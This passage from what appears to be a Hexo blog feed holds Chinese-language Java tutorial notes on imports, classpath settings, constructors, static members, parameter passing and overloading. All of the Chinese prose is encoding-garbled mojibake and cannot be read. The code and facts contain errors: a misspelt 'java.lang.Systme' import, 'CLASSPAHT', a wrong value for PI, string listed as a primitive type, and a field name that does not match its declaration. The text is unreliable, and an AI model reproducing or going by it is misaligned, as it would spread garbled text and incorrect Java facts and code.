<li>é€šè¿‡å…³é”®å­—<code>import</code>å¯¼å…¥ï¼Œ**<code>import</code>å¿…é¡»åœ¨<code>package</code>ä¹‹å**</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qiuyueqy.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br></pre></td></tr></table></figure>

<h3 id="é™æ€å¯¼å…¥"><a href="#é™æ€å¯¼å…¥" class="headerlink" title="é™æ€å¯¼å…¥"></a>é™æ€å¯¼å…¥</h3><p><code>import</code>è¯­å¥ä¸ä»…å¯ä»¥å¯¼å…¥ç±»ï¼Œè¿˜å¯ä»¥å¯¼å…¥ç±»çš„é™æ€æ–¹æ³•å’Œé™æ€åŸŸï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯¼å…¥Systemç±»çš„é™æ€æ–¹æ³•å’Œé™æ€åŸŸ</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Systme.*;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥ä½¿ç”¨Systemç±»çš„é™æ€æ–¹æ³•å’ŒåŸŸï¼Œè€Œä¸ç”¨åŠ å‰ç¼€ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">out.println(<span class="string">&quot;Hello World!&quot;</span>); <span class="comment">// System.out.println()</span></span><br><span class="line">exit(<span class="number">0</span>); <span class="comment">// System.exit()</span></span><br></pre></td></tr></table></figure>

<h2 id="ç±»è·¯å¾„"><a href="#ç±»è·¯å¾„" class="headerlink" title="ç±»è·¯å¾„"></a>ç±»è·¯å¾„</h2><p>javac ç¼–è¯‘å™¨è¦æŸ¥è¯¢ä¸€ä¸ªç¼–è¯‘å•å…ƒï¼Œä¼šå…ˆä»å½“å‰åŒ…å¼€å§‹ï¼Œç„¶åæŸ¥è¯¢æ‰€æœ‰ <code>import</code> è¯­å¥ï¼Œç¡®å®š<code>import</code>è¯­å¥å¯¼å…¥çš„åŒ…ä¸­æ˜¯å¦åŒ…å«æ‰€éœ€è¦çš„ç±»ã€‚</p>
<p>java è™šæ‹Ÿæœºï¼ˆjvmï¼‰æŸ¥è¯¢ç±»æ–‡ä»¶æ—¶ï¼Œå®ƒé¦–å…ˆåœ¨ jre/lib å’Œ jre/lib/ext ç›®å½•ä¸‹çš„å½’æ¡£æ–‡ä»¶ä¸­æ‰€å­˜æ”¾çš„ç³»ç»Ÿç±»æ–‡ä»¶é‡Œæ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å†ä»ç¯å¢ƒå˜é‡ CLASSPATHï¼ˆå¯ä»¥é€šè¿‡æ“ä½œç³»ç»Ÿæ¥è®¾ç½®ï¼‰é‡Œé¢æ‰¾ã€‚CLASSPATHåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç›®å½•ï¼Œç”¨ä½œæŸ¥æ‰¾ .class æ–‡ä»¶çš„æ ¹ç›®å½•ã€‚ä»æ ¹ç›®å½•å¼€å§‹ï¼Œè§£é‡Šå™¨è·å–åŒ…åç§°å¹¶å°†æ¯ä¸ªå¥ç‚¹æ›¿æ¢æˆåæ–œæ ï¼Œä»¥ä» CLASSPATH æ ¹ä¸­äº§ç”Ÿä¸€ä¸ªè·¯å¾„ï¼ˆä¾‹å¦‚ï¼Œpackage fruit.Apple å°±å˜æˆä¸º fruit/Apple æˆ– fruit/Apple æˆ–å…¶ä»–ï¼Œè¿™å°†å–å†³äºæ“ä½œç³»ç»Ÿï¼‰ã€‚å¾—åˆ°çš„è·¯å¾„ä¼šä¸ CLASSPATH ä¸­çš„å„ä¸ªä¸åŒçš„æ ¹ç›®å½•è·¯å¾„ç›¸è¿æ¥ä»¥è·å¾—ä¸€ä¸ªå®Œæ•´çš„ç›®å½•è·¯å¾„ï¼Œè§£é‡Šå™¨å°±åœ¨è¿™äº›ç›®å½•ä¸­æŸ¥æ‰¾ä¸ä½ æ‰€éœ€è¦çš„ç±»åç§°ç›¸åŒçš„ .class æ–‡ä»¶ã€‚</p>
<p>ç±»æ–‡ä»¶é»˜è®¤ä¸ java æ–‡ä»¶å¤„äºåŒä¸€ä½ç½®ï¼Œä½†ä¹Ÿå¯ä»¥å­˜å‚¨åœ¨ jarï¼ˆjava å½’æ¡£ï¼‰æ–‡ä»¶ä¸­ã€‚jar æ–‡ä»¶æ˜¯å¤šä¸ªå‹ç¼©å½¢å¼çš„ç±»æ–‡ä»¶å’Œå­ç›®å½•çš„é›†åˆã€‚é€šè¿‡ä½¿ç”¨ jar æ–‡ä»¶å¯ä»¥ä½¿ç±»è¢«å¤šä¸ªç¨‹åºå…±äº«ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œéœ€è¦åšåˆ°ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>æŠŠç±»æ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸­ã€‚è¿™ä¸ªç›®å½•æ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»“æ„çš„åŸºç›®å½•ã€‚ä¾‹å¦‚ï¼š<strong>å¦‚æœå¸Œæœ›å°†com.qiuyueqy.learnjavaç±»æ·»åŠ åˆ°å…¶ä¸­ï¼Œè¿™ä¸ª learnjava.class ç±»æ–‡ä»¶å°±å¿…é¡»ä½äºå­ç›®å½• /home/user/classdir/com/qiuyueqyä¸­</strong></li>
<li>å°†jaræ–‡ä»¶æ”¾åœ¨éç±»è·¯å¾„ä¸­ï¼Œå¦‚ï¼š/home/user/archives</li>
<li>è®¾ç½®ç±»è·¯å¾„ï¼ˆclass pathï¼‰ã€‚<strong>ç±»è·¯å¾„æ˜¯æ‰€æœ‰åŒ…å«ç±»æ–‡ä»¶çš„è·¯å¾„çš„é›†åˆ</strong>ã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/user/classdir:.:/home/user/archives/archives.jar // Linuxä¸‹</span><br><span class="line"></span><br><span class="line">C:\classdir;.;C:\archives\archives.jar // windowsä¸‹</span><br></pre></td></tr></table></figure>

<p>ç±»è·¯å¾„åŒ…æ‹¬ï¼š</p>
<ul>
<li>åŸºç›®å½•: å¦‚ /home/user/classdirå’ŒC:\classdir</li>
<li>å½“å‰ç›®å½•: .</li>
<li>jaræ–‡ä»¶ï¼š å¦‚ /home/user/archives/archives.jar æˆ– C:\archives\archives.jar</li>
</ul>
<h3 id="è®¾ç½®ç±»è·¯å¾„"><a href="#è®¾ç½®ç±»è·¯å¾„" class="headerlink" title="è®¾ç½®ç±»è·¯å¾„"></a>è®¾ç½®ç±»è·¯å¾„</h3><p>æœ€å¥½é€šè¿‡<code>-classpath</code>æˆ–<code>-cp</code>é€‰é¡¹æŒ‡å®šç±»è·¯å¾„ï¼Œä¾‹å¦‚è¦æ‰§è¡ŒEmployee.classï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -classpath /home/user/classdir:.:/home/user/archives/archives.jar Employee</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡<code>CLASSPAHT</code>ã€‚é»˜è®¤ CLASSPATH ä¸º<code>.</code>ï¼Œæ”¹ä¸ºæˆ‘ä»¬éœ€è¦çš„è·¯å¾„é›†åˆï¼Œè¿™æ ·åœ¨ shell é€€å‡ºå‰ CLASSPATH å˜é‡éƒ½æœ‰æ•ˆ:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> CLASSPATH=C:\classdir;.;C:\archives\archives.jar //windowsä¸‹</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=/home/user/classdir:.:/home/user/archives/archives.jar // Linuxä¸‹</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€â€”ç±»ä¸æ¥å£</title>
    <url>/2018/06/13/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%8E%A5%E5%8F%A3%E4%B8%8E%E7%B1%BB/</url>
    <content><![CDATA[<p><strong>Javaä¸­ï¼Œåªæœ‰åŸºæœ¬ç±»å‹(primitive types)ä¸æ˜¯å¯¹è±¡ï¼Œä¾‹å¦‚numberï¼Œstringå’Œboolean</strong>ã€‚</p>
<p>é¦–å…ˆè¦æ¸…æ¥šï¼šå¯¹è±¡ä¸å¯¹è±¡å˜é‡æ˜¯ä¸ä¸€æ ·çš„ã€‚å¯¹è±¡å˜é‡åªæ˜¯å¯¹å¯¹è±¡çš„ä¸€ä¸ªå¼•ç”¨ã€‚</p>
<p>æƒ³ä½¿ç”¨å¯¹è±¡å˜é‡ï¼Œé¦–å…ˆè¦æ„é€ å¯¹è±¡å¹¶æŒ‡å®šå…¶åˆå§‹çŠ¶æ€ã€‚<br>åœ¨å®šä¹‰ç±»æ—¶ï¼Œä½¿ç”¨<code>æ„é€ å™¨</code>æŒ‡å‡ºå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªç±»ï¼Œåœ¨æ„é€ ä¸€ä¸ªæ–°å®ä¾‹æ—¶ï¼Œæ„é€ å™¨ä¼šè¿è¡Œï¼Œå°†å®ä¾‹åŸŸåˆå§‹åŒ–ä¸ºæ‰€å¸Œæœ›çš„çŠ¶æ€ã€‚<strong>æ„é€ å™¨æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼Œæ²¡æœ‰è¿”å›å€¼</strong>ã€‚æ„é€ å™¨çš„åå­—ä¸ç±»åç›¸åŒã€‚<strong>ä¸€ä¸ªç±»æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ„é€ å™¨æ–¹æ³•</strong>ã€‚ä¸è¦åœ¨æ„é€ å™¨ä¸­å®šä¹‰ä¸å®ä¾‹åŸŸé‡åçš„å±€éƒ¨å˜é‡ï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String colour;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸‹é¢è¿™ä¸ªå°±æ˜¯æ„é€ å™¨ï¼Œæ–¹æ³•åä¸ç±»åç›¸åŒ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bird</span><span class="params">(String c, <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.colour = c;</span><br><span class="line">        <span class="keyword">this</span>.sex = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¦æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦åœ¨æ„é€ å™¨å‰é¢åŠ ä¸Š<code>new</code>æ“ä½œç¬¦ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bird bird = <span class="keyword">new</span> Bird(<span class="string">&quot;ç»¿è‰²&quot;</span>, <span class="number">0</span>) <span class="comment">// è¿™é‡Œçš„Birdåº”è¯¥ç†è§£ä¸ºè°ƒç”¨Birdç±»çš„æ„é€ å™¨ï¼Œæ„é€ å™¨å‰åŠ ä¸Šnewæ“ä½œç¬¦</span></span><br></pre></td></tr></table></figure>

<p>birdæ˜¯ä¸€ä¸ªå¯¹è±¡å˜é‡ï¼Œå¹¶æ²¡æœ‰å®é™…åŒ…å«ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä»…ä»…å¼•ç”¨ä¸€ä¸ªå¯¹è±¡ã€‚<strong>ä»»ä½•å¯¹è±¡å˜é‡çš„å€¼éƒ½æ˜¯å¯¹å­˜å‚¨åœ¨å¦ä¸€ä¸ªåœ°æ–¹çš„ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</strong></p>
<h2 id="æ›´æ”¹å™¨æ–¹æ³•ä¸è®¿é—®å™¨æ–¹æ³•"><a href="#æ›´æ”¹å™¨æ–¹æ³•ä¸è®¿é—®å™¨æ–¹æ³•" class="headerlink" title="æ›´æ”¹å™¨æ–¹æ³•ä¸è®¿é—®å™¨æ–¹æ³•"></a>æ›´æ”¹å™¨æ–¹æ³•ä¸è®¿é—®å™¨æ–¹æ³•</h2><p>å¯¹äºæ¯ä¸ªç‰¹å®šçš„ç±»å®ä¾‹ï¼Œéƒ½æœ‰ä¸€ç»„ç‰¹å®šçš„å®ä¾‹åŸŸå€¼ï¼Œè¿™äº›å€¼çš„é›†åˆå°±æ˜¯è¿™ä¸ªå¯¹è±¡çš„<code>å½“å‰çŠ¶æ€</code>ã€‚<br>å®ç°å°è£…çš„å…³é”®æ˜¯ç»ä¸èƒ½è®©ç±»ä¸­çš„æ–¹æ³•ç›´æ¥åœ°è®¿é—®å…¶ä»–ç±»çš„å®ä¾‹åŸŸã€‚ç¨‹åºä»…èƒ½é€šè¿‡å¯¹è±¡çš„æ–¹æ³•ä¸å¯¹è±¡çš„å®ä¾‹åŸŸè¿›è¡Œäº¤äº’ã€‚å¯¹è±¡çš„æ–¹æ³•ä¼šæ”¹å˜åŸå¯¹è±¡çš„çŠ¶æ€ï¼Œç§°ä¹‹ä¸ºæ›´æ”¹å™¨æ–¹æ³•ã€‚åªè®¿é—®å®ä¾‹åŸŸè€Œä¸æ”¹å˜åŸå¯¹è±¡çŠ¶æ€çš„æ–¹æ³•ï¼Œç§°ä¹‹ä¸ºè®¿é—®å™¨æ–¹æ³•ã€‚</p>
<p>è®¿é—®å™¨æ–¹æ³•ä¸è¦è¿”å›å¯å˜å¯¹è±¡ï¼Œå¦åˆ™è·å–è¿™ä¸ªå¯¹è±¡åé€šè¿‡è°ƒç”¨å¯å˜å¯¹è±¡çš„æ›´æ”¹å™¨æ–¹æ³•ä¼šç ´åå°è£…æ€§ï¼</p>
<h2 id="è‡ªå®šä¹‰ç±»"><a href="#è‡ªå®šä¹‰ç±»" class="headerlink" title="è‡ªå®šä¹‰ç±»"></a>è‡ªå®šä¹‰ç±»</h2><p>å…³é”®å­—<code>public</code>ä¿®é¥°çš„ç±»ç§°ä¸ºå…±æœ‰ç±»ã€‚<strong>åœ¨ä¸€ä¸ª.javaæºæ–‡ä»¶ï¼ˆç¼–è¯‘å•å…ƒï¼‰ä¸­ï¼Œåªèƒ½æœ‰ä¸€ä¸ªå…±æœ‰ç±»ï¼Œç±»åä¸æ–‡ä»¶åç›¸åŒ</strong>ã€‚å¯ä»¥æœ‰å¤šä¸ªéå…¬æœ‰ç±»ã€‚åŒ…ä¹‹å¤–çš„ä¸–ç•Œæ˜¯æ— æ³•çœ‹è§è¿™äº›éå…¬æœ‰ç±»çš„ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯publicç±»ï¼Œè€Œä¸”å®ƒä»¬ä¸»è¦ç”¨æ¥ä¸ºå…¬æœ‰ç±»æä¾›æ”¯æŒã€‚</p>
<p>å…³é”®å­—<code>public</code>ä¿®é¥°çš„æ–¹æ³•ã€å­—æ®µæ„å‘³ç€ä»»ä½•ç±»çš„ä»»ä½•æ–¹æ³•éƒ½å¯ä»¥é€šè¿‡ç‚¹æ“ä½œè°ƒç”¨è¿™äº›æ–¹æ³•å’Œå­—æ®µï¼Œè€Œ<code>private</code>ç¡®ä¿åªæœ‰è‡ªèº«ç±»å¯ä»¥è®¿é—®è¿™äº›å®ä¾‹åŸŸæˆ–æ–¹æ³•ã€‚ï¼ˆ<strong>åŒå±ä¸€ä¸ªç±»çš„å®ä¾‹å¯ä»¥äº’ç›¸è®¿é—®è®¿é—®ç§æœ‰åŸŸ</strong>ï¼‰</p>
<p>å¯ä»¥æŠŠå®ä¾‹åŸŸå®šä¹‰ä¸º<code>final</code>ã€‚æ„é€ å¯¹è±¡æ—¶å¿…é¡»è¦åˆå§‹åŒ–è¿™æ ·çš„åŸŸï¼ˆæ„é€ å™¨ä¹‹å‰<br>ï¼‰ï¼Œå¹¶ä¸”åœ¨åé¢çš„æ“ä½œä¸­ä¸èƒ½å†å¯¹å®ƒè¿›è¡Œæ”¹å˜ã€‚</p>
<h2 id="é™æ€å¸¸é‡"><a href="#é™æ€å¸¸é‡" class="headerlink" title="é™æ€å¸¸é‡"></a>é™æ€å¸¸é‡</h2><p>åœ¨ Math ç±»ä¸­å®šä¹‰åœ†å‘¨ç‡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Math</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.14159265758</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¨‹åºä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>Math.PI</code>è·å–è¿™ä¸ªå¸¸é‡ã€‚<br>å¦‚æœå…³é”®å­—<code>static</code>è¢«çœç•¥ï¼ŒPIå°±å˜æˆäº†Mathç±»çš„ä¸€ä¸ªå®ä¾‹åŸŸã€‚éœ€è¦é€šè¿‡Mathç±»çš„å¯¹è±¡è®¿é—®PIï¼Œå¹¶ä¸”æ¯ä¸€ä¸ªMathå¯¹è±¡éƒ½æœ‰ä»–è‡ªå·±çš„ä¸€ä»½PIæ‹·è´<br>æ¯ä¸ªç±»å¯¹è±¡éƒ½å¯ä»¥å¯¹å…¬æœ‰åŸŸè¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥æœ€å¥½ä¸è¦æŠŠåŸŸè®¾è®¡æˆ<code>public</code>ã€‚ç„¶è€Œå…±æœ‰å¸¸é‡ï¼ˆå³finalåŸŸï¼‰å´æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºPIè¢«å£°æ˜ä¸º<code>final</code>ï¼Œä¸å…è®¸å†ä¿®æ”¹å®ƒçš„å€¼ã€‚</p>
<h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>æ–¹æ³•å°è£…äº†ä¸€ç³»åˆ—è¯­å¥æ‰€æè¿°çš„è¿ç®—ã€‚æ–¹æ³•éœ€è¦å‚æ•°ï¼ˆæŸç§æ•°æ®ç±»å‹çš„å€¼ï¼‰å¹¶æ ¹æ®å‚æ•°è®¡ç®—å‡ºæŸç§æ•°æ®ç±»å‹çš„è¿”å›å€¼ï¼ˆä¾‹å¦‚æ•°å­¦å‡½æ•°çš„ç»“æœï¼‰æˆ–è€…äº§ç”ŸæŸç§å‰¯ä½œç”¨ï¼ˆä¾‹å¦‚mainå‡½æ•°ï¼‰</p>
<h3 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h3><p>é™æ€æ–¹æ³•æ˜¯ä¸€ç§ä¸èƒ½å‘å¯¹è±¡å®æ–½æ“ä½œçš„æ–¹æ³•ã€‚å¯ä»¥è®¤ä¸ºé™æ€æ–¹æ³•æ˜¯æ²¡æœ‰<code>this</code>å‚æ•°çš„æ–¹æ³•ã€‚é™æ€æ–¹æ³•ä¸èƒ½è®¿é—®å®ä¾‹åŸŸï¼Œå› ä¸ºå®ƒä¸èƒ½æ“ä½œå¯¹è±¡ï¼Œä½†æ˜¯é™æ€æ–¹æ³•å¯ä»¥è®¿é—®è‡ªèº«ç±»çš„é™æ€åŸŸã€‚ä¸€ä¸‹ä¸¤ç§æƒ…å†µé€‚åˆç”¨é™æ€æ–¹æ³•ï¼š</p>
<ol>
<li>ä¸€ä¸ªæ–¹æ³•ä¸éœ€è¦è®¿é—®å¯¹è±¡çŠ¶æ€ï¼Œå…¶æ‰€éœ€è¦çš„å‚æ•°éƒ½æ˜¯é€šè¿‡æ˜¾ç¤ºå‚æ•°æä¾›</li>
<li>ä¸€ä¸ªæ–¹æ³•åªéœ€è¦è®¿é—®ç±»çš„é™æ€åŸŸ</li>
</ol>
<p>é™æ€æ–¹æ³•è¿˜æœ‰ä¸€ç§å¸¸è§ç”¨é€”å°±æ˜¯ç”¨é™æ€å·¥å‚æ–¹æ³•æ„é€ å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨<code>new</code>æ„é€ ç¬¦ã€‚</p>
<h3 id="main-æ–¹æ³•"><a href="#main-æ–¹æ³•" class="headerlink" title="main æ–¹æ³•"></a>main æ–¹æ³•</h3><p>è°ƒç”¨é™æ€æ–¹æ³•ä¸éœ€è¦ä½¿ç”¨å¯¹è±¡ï¼ŒåŒç†ï¼Œmain æ–¹æ³•ä¹Ÿæ˜¯é™æ€æ–¹æ³•ã€‚<br>main æ–¹æ³•ä¸å¯¹ä»»ä½•å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œäº‹å®ä¸Šï¼Œåœ¨å¯åŠ¨ç¨‹åºæ—¶è¿˜æ²¡æœ‰ä»»ä½•ä¸€ä¸ªå¯¹è±¡ã€‚é™æ€çš„mainæ–¹æ³•å°†æ‰§è¡Œå¹¶åˆ›å»ºç¨‹åºæ‰€éœ€è¦çš„å¯¹è±¡<br>æ¯ä¸ªç±»å¯ä»¥æœ‰ä¸€ä¸ª main æ–¹æ³•ï¼Œè¿™æ˜¯å¸¸ç”¨äºç±»çš„å•å…ƒæµ‹è¯•çš„æŠ€å·§ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String n, <span class="keyword">int</span> a, <span class="keyword">double</span> s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">        <span class="keyword">this</span>.age = a;</span><br><span class="line">        <span class="keyword">this</span>.salary = s;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee e = <span class="keyword">new</span> Employee(<span class="string">&quot;Mike&quot;</span>, <span class="number">21</span>, <span class="number">2354</span>);</span><br><span class="line">        e.raiseSalary(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³ç‹¬ç«‹æµ‹è¯•Employeeç±»ï¼Œåªéœ€æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Employee</span><br></pre></td></tr></table></figure>

<p>å¦‚æœEmployeeç±»æ˜¯ä¸€ä¸ªApplicationçš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æ‰§è¡Œç¨‹åº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Application</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ Employee ä¸­çš„ main æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œ</p>
<h3 id="æ–¹æ³•å‚æ•°"><a href="#æ–¹æ³•å‚æ•°" class="headerlink" title="æ–¹æ³•å‚æ•°"></a>æ–¹æ³•å‚æ•°</h3><p>javaçš„å¯¹è±¡å¼•ç”¨æ˜¯<code>æŒ‰å€¼ä¼ é€’</code>è€Œä¸æ˜¯<code>å¼•ç”¨è°ƒç”¨</code>ã€‚<strong>æ–¹æ³•å¾—åˆ°çš„æ˜¯æ‰€æœ‰å‚æ•°å€¼å¾—ä¸€ä¸ªæ‹·è´ï¼Œè€Œä¸æ˜¯æŒ‡é’ˆ</strong>ã€‚æ–¹æ³•ä¸èƒ½ä¿®æ”¹ä¼ é€’ç»™å®ƒçš„ä»»ä½•å‚æ•°å˜é‡çš„å†…å®¹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(<span class="keyword">double</span> Salary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Salary = Salary * <span class="number">3</span>; <span class="comment">// è¿™ä¸ä¼šå¯¹Salaryå¯¹åº”çš„å®å‚é€ æˆä»»ä½•å½±å“</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ï¼Œæ”¹å˜å¯¹è±¡å‚æ•°çŠ¶æ€ä¸æ˜¯ä¸€ä»¶éš¾äº‹ã€‚<strong>ç”±äºjavaå¾—åˆ°çš„æ˜¯å¯¹è±¡å¼•ç”¨çš„æ‹·è´ï¼Œè€Œå¯¹è±¡å¼•ç”¨åŠå…¶æ‹·è´éƒ½ä¼šæŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡</strong>ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ”¹å˜å¯¹è±¡å¼•ç”¨æ‹·è´è¾¾åˆ°ä¿®æ”¹å¯¹è±¡å‚æ•°çš„ç›®çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(Employee e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e.Salary = e.Salary * <span class="number">3</span>; <span class="comment">// è¿™ä¼šä¿®æ”¹Employeeå®ä¾‹çš„SalaryåŸŸ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ä¸€ä¸‹ï¼š</p>
<ol>
<li>ä¸€ä¸ªæ–¹æ³•ä¸èƒ½ä¿®æ”¹ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹çš„å‚æ•°</li>
<li>ä¸€ä¸ªæ–¹æ³•å¯ä»¥æ”¹å˜ä¸€ä¸ªå¯¹è±¡å‚æ•°çš„çŠ¶æ€</li>
<li>ä¸€ä¸ªæ–¹æ³•ä¸èƒ½è®©å¯¹è±¡å‚æ•°å¼•ç”¨ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼ˆå³æ— æ³•æ”¹å˜å®å‚çš„å¼•ç”¨å¯¹è±¡ï¼Œè¿™ç‚¹ä¹Ÿæ˜¯ç”±æŒ‰å€¼ä¼ é€’å†³å®šçš„ï¼‰</li>
</ol>
<h2 id="é‡è½½"><a href="#é‡è½½" class="headerlink" title="é‡è½½"></a>é‡è½½</h2><p>å¤šä¸ªæ–¹æ³•æœ‰ç›¸åŒçš„åå­—ã€ä¸åŒçš„å‚æ•°ï¼Œä¾¿äº§ç”Ÿäº†é‡è½½ã€‚ç¼–è¯‘å™¨å¿…é¡»æŒ‘é€‰å‡ºå…·ä½“æ‰§è¡Œå“ªä¸ªæ–¹æ³•ï¼Œå®ƒé€šè¿‡å„ä¸ªæ–¹æ³•ç»™å‡ºçš„å‚æ•°ç±»å‹ä¸ç‰¹å®šæ–¹æ³•è°ƒç”¨æ‰€ä½¿ç”¨çš„å€¼ç±»å‹è¿›è¡ŒåŒ¹é…æ¥æŒ‘é€‰å‡ºç›¸åº”çš„æ–¹æ³•ï¼ˆè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºé‡è½½è§£æï¼‰ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String aName, <span class="keyword">int</span> aid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = aName;</span><br><span class="line">        <span class="keyword">this</span>.id = aid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(<span class="keyword">int</span> aid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;Employee&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.id = aid;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

